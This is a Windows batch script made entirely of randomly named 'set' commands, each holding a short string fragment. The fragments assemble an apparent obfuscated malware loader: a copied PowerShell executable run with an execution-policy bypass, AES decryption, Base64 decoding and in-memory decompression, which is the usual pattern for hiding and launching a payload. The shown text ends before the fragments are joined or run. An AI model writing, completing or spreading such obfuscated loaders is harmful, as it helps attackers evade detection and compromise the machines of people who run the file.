@echo off
set "hndhIBxlqb=do"
set "AXjfVDeobf=.e"
set "RQnIQfEZwN=em"
set "BtUVnbigDy=he"
set "lmLerkrtEz= C"
set "eCvCRwWmKI=st"
set "ySzbAvfISc=0\"
set "CDfjmQIWvR=32"
set "oyGtKtFitm=we"
set "TppDOZVNJr=he"
set "plNUztBkqb=in"
set "nhsqxrPlKS=Po"
set "IFAOFEoUor=xe"
set "hsSyjJSQhK=rs"
set "pKyTmflVZx=:\"
set "VWMlPBwHyh=po"
set "IOEakGOtMT= /"
set "XUrtZZicFK=1."
set "CADyMpcXIJ=ll"
set "GJpcNeSwGf=\W"
set "BrSHfGbMYi=\v"
set "NaRSbhAlUM=ws"
set "YiPBtQUiyN=we"
set "LmByMpuxiH=ll"
set "HnZyCmxxCq=s\"
set "XZOnBaaBBx=Wi"
set "kPSghLmzUl=Sy"
set "HUixjEjPaJ=y "
set "HGgFsptUTr=rS"
set "DHezYSiYWz=py"
set "sExYZabIAw=nd"
set "mMNRHWUHbT=co"
set "FBcCDTjknS=ow"
set "jXqaCGIiQu= %~dp0"
set "ofXndnYGIP=cd"
set "BPjCqXmYGm=ispo"
set "BsCkILJVOa=[Env"
set "FtNLuUHddM=GQge"
set "HBIdcknZLG=ing("
set "ZfwQRpgQRY=-ep "
set "DzTspTlCAt=sion"
set "PWiQeTtYrn=ddin"
set "LpTAgwqlAz=RVFq"
set "yscaDIIPxu=:: '"
set "XhPKOOucvB=TUb "
set "PeJqZbSUUs=.Cry"
set "vsJBUtcRlS=em.C"
set "YOXbYHpzfg=.Mem"
set "bbYQVHdVyt=.Len"
set "oQzXLvQoVy=HDjY"
set "gIuvyVdwwP=uyk."
set "FgjJkiuaHF=.-16"
set "UHlWSzAMim=rity"
set "ABVVTXElHF=oryS"
set "pXMRnSdhrz=esMa"
set "GhwlXXYOZG=Hebz"
set "VqksUDixSY=SeWe"
set "ElhxIlSwfv=iron"
set "XhpExiLdgK=ecry"
set "aZzGCigWja=[Sys"
set "LnPMIXfoaW=y]::"
set "SVsmfCbFfU=]::("
set "PlFfKotMFf=iZ.I"
set "OuzrOmPbfQ=y.Pa"
set "vANhJHQtUo=SGQg"
set "NlUkrnTghM=Obje"
set "UhawqZmgKi=lBlo"
set "XSJqXRXmxd=('da"
set "wMDWPerWQY=ateD"
set "sPMfdiFGKn=m.IO"
set "ShzqlzyUDc=)))"
set "TxWNaKzuXo=6esa"
set "CjvgwWdpbY=ion."
set "nFoYBhDPTH=[IO."
set "yPFJedOTdh=PxEW"
set "QlowFcYMmK=zuZI"
set "NrOszEeNol=Comp"
set "lQyCbIHZlg=grap"
set "WSKCZpbRgy= New"
set "QwvGbyFIOr='[-1"
set "HKulTdtqxg=orF'"
set "wqErMIBuhn=$RVF"
set "usulKIHxWm=.Dis"
set "RzqZKKIzUJ=eam("
set "UppPvUdkMu=fore"
set "VDJDHTJAuw=);$S"
set "vYhguVUaoS=-4] "
set "QfoebnrQWi=tS46"
